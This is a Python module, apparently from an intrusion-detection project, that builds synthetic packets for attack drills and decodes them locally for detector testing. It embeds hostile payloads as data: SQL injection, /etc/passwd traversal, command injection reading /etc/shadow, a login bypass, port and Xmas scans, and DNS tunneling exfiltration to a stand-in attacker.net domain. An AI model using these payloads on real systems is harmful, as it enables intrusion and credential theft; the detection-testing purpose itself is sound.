"""Synthetic raw packet generator and multi-vector attack drill simulator."""
import os
import random
import socket
import struct
import time
from typing import List, Tuple
from sentinel.parsers.binary_decoder import decode_packet
from sentinel.core.models import DecodedPacket


def ip_to_bytes(ip_str: str) -> bytes:
    return socket.inet_aton(ip_str)


def mac_to_bytes(mac_str: str) -> bytes:
    return bytes(int(b, 16) for b in mac_str.split(":"))


def build_ethernet_frame(src_mac: str, dst_mac: str, eth_type: int, payload: bytes) -> bytes:
    return struct.pack("!6s6sH", mac_to_bytes(dst_mac), mac_to_bytes(src_mac), eth_type) + payload


def build_ipv4_packet(src_ip: str, dst_ip: str, protocol: int, payload: bytes, ttl: int = 64) -> bytes:
    version_ihl = (4 << 4) | 5
    tos = 0
    total_length = 20 + len(payload)
    identification = random.randint(1000, 65000)
    flags_frag = 0
    checksum = 0
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, tos, total_length, identification, flags_frag,
        ttl, protocol, checksum, ip_to_bytes(src_ip), ip_to_bytes(dst_ip),
    )
    return header + payload


def build_tcp_segment(src_port: int, dst_port: int, flags: int, payload: bytes = b"", seq_num: int = 1000, ack_num: int = 0) -> bytes:
    data_offset = (5 << 4)
    window = 8192
    checksum = 0
    urgent = 0
    header = struct.pack(
        "!HHLLBBHHH",
        src_port, dst_port, seq_num, ack_num, data_offset,
        flags, window, checksum, urgent,
    )
    return header + payload


def build_udp_datagram(src_port: int, dst_port: int, payload: bytes) -> bytes:
    length = 8 + len(payload)
    checksum = 0
    header = struct.pack("!HHHH", src_port, dst_port, length, checksum)
    return header + payload


def build_dns_query(domain: str, tx_id: int = 0x1234) -> bytes:
    flags = 0x0100
    hdr = struct.pack("!HHHHHH", tx_id, flags, 1, 0, 0, 0)
    qname = b""
    for part in domain.split("."):
        if part:
            qname += bytes([len(part)]) + part.encode("ascii")
    qname += b"\x00"
    question = qname + struct.pack("!HH", 1, 1)
    return hdr + question


def build_full_packet(src_ip: str, dst_ip: str, src_port: int, dst_port: int, protocol: str, payload: bytes = b"", tcp_flags: int = 0x18) -> bytes:
    src_mac = "02:00:00:11:22:33"
    dst_mac = "02:00:00:44:55:66"
    if protocol.upper() == "TCP":
        l4 = build_tcp_segment(src_port, dst_port, flags=tcp_flags, payload=payload)
        ip = build_ipv4_packet(src_ip, dst_ip, protocol=6, payload=l4)
    elif protocol.upper() == "UDP":
        l4 = build_udp_datagram(src_port, dst_port, payload=payload)
        ip = build_ipv4_packet(src_ip, dst_ip, protocol=17, payload=l4)
    else:
        ip = build_ipv4_packet(src_ip, dst_ip, protocol=1, payload=payload)
    return build_ethernet_frame(src_mac, dst_mac, eth_type=0x0800, payload=ip)


class SyntheticAttackGenerator:
    @staticmethod
    def generate_port_scan_packets(src_ip: str = "192.168.1.150", dst_ip: str = "10.0.0.5", num_ports: int = 25) -> List[DecodedPacket]:
        packets: List[DecodedPacket] = []
        base_ts = time.time()
        for i in range(num_ports):
            port = 20 + i
            raw = build_full_packet(src_ip, dst_ip, src_port=random.randint(40000, 60000), dst_port=port, protocol="TCP", tcp_flags=0x02)
            packets.append(decode_packet(raw, timestamp=base_ts + (i * 0.05)))
        return packets

    @staticmethod
    def generate_stealth_xmas_scan(src_ip: str = "192.168.1.151", dst_ip: str = "10.0.0.5") -> DecodedPacket:
        raw = build_full_packet(src_ip, dst_ip, src_port=54321, dst_port=80, protocol="TCP", tcp_flags=0x29)
        return decode_packet(raw, timestamp=time.time())

    @staticmethod
    def generate_sqli_packet(src_ip: str = "192.168.1.152", dst_ip: str = "10.0.0.5") -> DecodedPacket:
        http_payload = (
            b"GET /search.php?id=1%20UNION%20ALL%20SELECT%20username,password%20FROM%20users%20-- HTTP/1.1\r\n"
            b"Host: 10.0.0.5\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n"
        )
        raw = build_full_packet(src_ip, dst_ip, src_port=51234, dst_port=80, protocol="TCP", payload=http_payload)
        return decode_packet(raw, timestamp=time.time())

    @staticmethod
    def generate_directory_traversal_packet(src_ip: str = "192.168.1.153", dst_ip: str = "10.0.0.5") -> DecodedPacket:
        http_payload = b"GET /view_file?path=../../../../etc/passwd HTTP/1.1\r\nHost: 10.0.0.5\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
        raw = build_full_packet(src_ip, dst_ip, src_port=51235, dst_port=8080, protocol="TCP", payload=http_payload)
        return decode_packet(raw, timestamp=time.time())

    @staticmethod
    def generate_cmd_injection_packet(src_ip: str = "192.168.1.154", dst_ip: str = "10.0.0.5") -> DecodedPacket:
        http_payload = (
            b"POST /api/exec HTTP/1.1\r\nHost: 10.0.0.5\r\nContent-Type: application/x-www-form-urlencoded\r\n"
            b"User-Agent: sqlmap/1.6.12\r\n\r\ntarget=127.0.0.1; whoami; /bin/sh -c 'cat /etc/shadow'"
        )
        raw = build_full_packet(src_ip, dst_ip, src_port=51236, dst_port=80, protocol="TCP", payload=http_payload)
        return decode_packet(raw, timestamp=time.time())

    @staticmethod
    def generate_dns_tunneling_packet(src_ip: str = "192.168.1.155", dst_ip: str = "8.8.8.8") -> DecodedPacket:
        exfil_domain = "4f8a91b2c3d4e5f67890abcdef1234567890abcdef.tunnel.attacker.net"
        dns_payload = build_dns_query(exfil_domain)
        raw = build_full_packet(src_ip, dst_ip, src_port=53100, dst_port=53, protocol="UDP", payload=dns_payload)
        return decode_packet(raw, timestamp=time.time())

    @staticmethod
    def generate_high_entropy_packet(src_ip: str = "192.168.1.156", dst_ip: str = "10.0.0.5") -> DecodedPacket:
        random_bytes = os.urandom(256)
        raw = build_full_packet(src_ip, dst_ip, src_port=58912, dst_port=4444, protocol="TCP", payload=random_bytes)
        return decode_packet(raw, timestamp=time.time())

    @classmethod
    def generate_multi_stage_campaign(cls, attacker_ip: str = "198.51.100.77", target_ip: str = "10.0.0.10") -> List[DecodedPacket]:
        campaign: List[DecodedPacket] = []
        base_ts = time.time()
        for i in range(20):
            port = 80 + i * 10
            raw = build_full_packet(attacker_ip, target_ip, src_port=40000 + i, dst_port=port, protocol="TCP", tcp_flags=0x02)
            campaign.append(decode_packet(raw, timestamp=base_ts + (i * 0.05)))

        nikto_raw = build_full_packet(attacker_ip, target_ip, src_port=41001, dst_port=80, protocol="TCP", payload=b"GET /admin/ HTTP/1.1\r\nHost: 10.0.0.10\r\nUser-Agent: Nikto/2.1.6\r\n\r\n")
        campaign.append(decode_packet(nikto_raw, timestamp=base_ts + 2.0))

        exploit_raw = build_full_packet(attacker_ip, target_ip, src_port=41002, dst_port=80, protocol="TCP", payload=b"POST /login HTTP/1.1\r\nHost: 10.0.0.10\r\n\r\nuser=' OR '1'='1'; whoami; /bin/sh")
        campaign.append(decode_packet(exploit_raw, timestamp=base_ts + 3.0))

        exfil_raw = build_full_packet(attacker_ip, target_ip, src_port=41003, dst_port=9001, protocol="TCP", payload=os.urandom(300))
        campaign.append(decode_packet(exfil_raw, timestamp=base_ts + 4.0))

        return campaign
